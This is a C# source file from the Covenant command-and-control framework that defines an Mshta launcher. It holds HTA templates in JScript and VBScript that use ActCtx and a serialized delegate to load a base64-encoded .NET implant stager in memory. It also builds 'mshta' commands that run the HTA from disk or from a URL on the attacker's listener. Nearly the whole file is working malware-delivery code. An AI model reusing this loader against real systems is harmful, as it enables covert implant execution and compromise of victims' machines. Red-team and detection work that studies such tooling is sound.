// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class MshtaLauncher : ScriptletLauncher
    {
        public MshtaLauncher()
        {
            this.Name = "Mshta";
            this.Type = LauncherType.Mshta;
            this.Description = "Uses mshta.exe to launch a Grunt using Activation Context (ActCtx) technique. Works on modern Windows versions.";
            this.ScriptType = ScriptletType.TaggedScript;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
            this.CompressStager = false;
        }

        // HTA template using ActCtx technique with DotNetToJScript
        // Uses the delegate serialization approach with DynamicInvoke
        private static string HtaJScriptTemplate = @"<html>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<head>
    <title>Application</title>
    <meta charset=""utf-8"">
    <meta http-equiv=""x-ua-compatible"" content=""ie=9"">
    <script language=""javascript"">
        var manifestXML = '<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1""><assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />'+
        '<clrClass clsid=""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"" progid=""System.Text.ASCIIEncoding"" threadingModel=""Both"" name=""System.Text.ASCIIEncoding"" runtimeVersion=""v4.0.30319"" />'+
        '<clrClass clsid=""{C1ABB475-F198-39D5-BF8D-330BC7189661}"" progid=""System.Security.Cryptography.FromBase64Transform"" threadingModel=""Both"" name=""System.Security.Cryptography.FromBase64Transform"" runtimeVersion=""v4.0.30319"" />'+
        '<clrClass clsid=""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"" progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" />'+
        '<clrClass clsid=""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"" progid=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" runtimeVersion=""v4.0.30319"" />'+
        '<clrClass clsid=""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"" progid=""System.Collections.ArrayList"" threadingModel=""Both"" name=""System.Collections.ArrayList"" runtimeVersion=""v4.0.30319"" /></assembly>';

        var actObj = new ActiveXObject(""Microsoft.Windows.ActCtx"");
        actObj.ManifestText = manifestXML;

        function Base64ToStream(b, byteLen) {
            var enc = actObj.CreateObject(""System.Text.ASCIIEncoding"");
            var length = enc.GetByteCount_2(b);
            var ba = enc.GetBytes_4(b);
            var transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"");
            ba = transform.TransformFinalBlock(ba, 0, length);
            var ms = actObj.CreateObject(""System.IO.MemoryStream"");
            ms.Write(ba, 0, byteLen);
            ms.Position = 0;
            return ms;
        }

        try {
            alert('[*] Step 1: Decoding payload (' + {{REPLACE_BYTE_LENGTH}} + ' bytes)...');
            var serialized_str = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";
            var stream = Base64ToStream(serialized_str, {{REPLACE_BYTE_LENGTH}});
            alert('[+] Step 1: Stream created');

            alert('[*] Step 2: Deserializing...');
            var formatter = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
            var array = actObj.CreateObject('System.Collections.ArrayList');
            var d = formatter.Deserialize_2(stream);
            alert('[+] Step 2: Deserialized delegate');

            alert('[*] Step 3: Loading assembly...');
            array.Add(undefined);
            var asm = d.DynamicInvoke(array.ToArray());
            alert('[+] Step 3: Assembly loaded: ' + asm.FullName);

            alert('[*] Step 4: Creating stager instance...');
            var o = asm.CreateInstance('GruntStager.GruntStager');
            alert('[+] Step 4: Stager executed successfully');
        } catch (e) {
            alert('[!] ERROR: ' + e.message);
        }
    </script>
</head>
</html>";

        private static string HtaVBScriptTemplate = @"<html>
<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">
<HTA:APPLICATION ID=""app"" WINDOWSTATE=""minimize"">
<head>
    <title>Application</title>
    <meta charset=""utf-8"">
    <meta http-equiv=""x-ua-compatible"" content=""ie=9"">
    <script language=""vbscript"">
        Dim manifestXML, actObj
        manifestXML = ""<?xml version=""""1.0"""" encoding=""""UTF-16"""" standalone=""""yes""""?>"" & _
        ""<assembly manifestVersion=""""1.0"""" xmlns=""""urn:schemas-microsoft-com:asm.v1"""">"" & _
        ""<assemblyIdentity name=""""mscorlib"""" version=""""4.0.0.0"""" publicKeyToken=""""B77A5C561934E089"""" />"" & _
        ""<clrClass clsid=""""{9E28EF95-9C6F-3A00-B525-36A76178CC9C}"""" progid=""""System.Text.ASCIIEncoding"""" threadingModel=""""Both"""" name=""""System.Text.ASCIIEncoding"""" runtimeVersion=""""v4.0.30319"""" />"" & _
        ""<clrClass clsid=""""{C1ABB475-F198-39D5-BF8D-330BC7189661}"""" progid=""""System.Security.Cryptography.FromBase64Transform"""" threadingModel=""""Both"""" name=""""System.Security.Cryptography.FromBase64Transform"""" runtimeVersion=""""v4.0.30319"""" />"" & _
        ""<clrClass clsid=""""{F5E692D9-8A87-349D-9657-F96E5799D2F4}"""" progid=""""System.IO.MemoryStream"""" threadingModel=""""Both"""" name=""""System.IO.MemoryStream"""" runtimeVersion=""""v4.0.30319"""" />"" & _
        ""<clrClass clsid=""""{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}"""" progid=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" threadingModel=""""Both"""" name=""""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"""" runtimeVersion=""""v4.0.30319"""" />"" & _
        ""<clrClass clsid=""""{6896B49D-7AFB-34DC-934E-5ADD38EEEE39}"""" progid=""""System.Collections.ArrayList"""" threadingModel=""""Both"""" name=""""System.Collections.ArrayList"""" runtimeVersion=""""v4.0.30319"""" />"" & _
        ""</assembly>""

        Set actObj = CreateObject(""Microsoft.Windows.ActCtx"")
        actObj.ManifestText = manifestXML

        Function Base64ToStream(b, byteLen)
            Dim enc, length, ba, transform, ms
            Set enc = actObj.CreateObject(""System.Text.ASCIIEncoding"")
            length = enc.GetByteCount_2(b)
            ba = enc.GetBytes_4(b)
            Set transform = actObj.CreateObject(""System.Security.Cryptography.FromBase64Transform"")
            ba = transform.TransformFinalBlock(ba, 0, length)
            Set ms = actObj.CreateObject(""System.IO.MemoryStream"")
            ms.Write ba, 0, byteLen
            ms.Position = 0
            Set Base64ToStream = ms
        End Function

        On Error Resume Next
        Dim s
        s = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}""

        Dim formatter, arr, d, o
        Set formatter = actObj.CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
        Set arr = actObj.CreateObject(""System.Collections.ArrayList"")
        arr.Add Empty

        Set d = formatter.Deserialize_2(Base64ToStream(s, {{REPLACE_BYTE_LENGTH}}))
        Set o = d.DynamicInvoke(arr.ToArray()).CreateInstance(""GruntStager.GruntStager"")
    </script>
</head>
</html>";

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);

            // Decode the front delegate template
            byte[] frontBytes = Convert.FromBase64String(FrontBinaryFormattedDelegate);

            // CRITICAL: Patch the array length in the serialized data
            // The FrontBinaryFormattedDelegate ends with an ArraySinglePrimitive header:
            // [0x0F][ObjectId:4bytes][Length:4bytes][ElementType:1byte]
            // The length field is at position (length - 5) to (length - 2)
            // We need to patch it to match the actual StagerAssembly size
            int lengthPosition = frontBytes.Length - 5; // Position of the 4-byte length field
            byte[] assemblyLengthBytes = BitConverter.GetBytes(StagerAssembly.Length);
            frontBytes[lengthPosition] = assemblyLengthBytes[0];
            frontBytes[lengthPosition + 1] = assemblyLengthBytes[1];
            frontBytes[lengthPosition + 2] = assemblyLengthBytes[2];
            frontBytes[lengthPosition + 3] = assemblyLengthBytes[3];

            // Now concatenate: patched front + assembly bytes + end
            byte[] serializedDelegate = frontBytes
                .Concat(StagerAssembly)
                .Concat(Convert.FromBase64String(EndBinaryFormattedDelegate))
                .ToArray();

            // Store actual byte length BEFORE any padding
            int actualByteLength = serializedDelegate.Length;

            // Ensure proper padding for base64 (pad with zeros if needed)
            int ofs = serializedDelegate.Length % 3;
            if (ofs != 0)
            {
                int paddedLength = serializedDelegate.Length + (3 - ofs);
                Array.Resize(ref serializedDelegate, paddedLength);
            }

            string base64Delegate = Convert.ToBase64String(serializedDelegate);

            // Generate HTA based on script language
            // Use single string (no splitting) to avoid potential parsing issues
            if (this.ScriptLanguage == ScriptingLanguage.JScript)
            {
                this.DiskCode = HtaJScriptTemplate
                    .Replace(Environment.NewLine, "\r\n")
                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
            }
            else if (this.ScriptLanguage == ScriptingLanguage.VBScript)
            {
                this.DiskCode = HtaVBScriptTemplate
                    .Replace(Environment.NewLine, "\r\n")
                    .Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", base64Delegate)
                    .Replace("{{REPLACE_BYTE_LENGTH}}", actualByteLength.ToString());
            }

            return GetLauncher();
        }

        protected override string GetLauncher()
        {
            string launcher = "mshta" + " " + "file.hta";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
                Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                string launcher = "mshta" + " " + hostedLocation;
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
